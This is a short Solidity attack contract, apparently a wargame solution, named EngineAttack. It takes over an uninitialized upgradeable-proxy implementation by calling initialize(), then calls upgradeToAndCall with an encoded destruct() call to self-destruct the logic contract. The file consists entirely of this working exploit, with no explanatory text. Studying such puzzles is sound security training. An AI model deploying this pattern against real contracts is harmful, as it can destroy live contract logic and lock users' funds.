pragma solidity ^0.8.0;

interface Attack {
    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;

    function initialize() external;
}

contract EngineAttack {
    Attack public attackee;

    constructor(address actualImplementation) public payable {
        bytes memory emptyBytes;
        attackee = Attack(actualImplementation);
        // attackee.upgradeToAndCall(newImplementation, emptyBytes);
    }

    function callInitializer() public {
        attackee.initialize();
    }

    function callUpgradeAndCall(address newImplementation) public {
        bytes memory destructFunc = abi.encodeWithSignature("destruct()");
        attackee.upgradeToAndCall(newImplementation, destructFunc);
    }
}
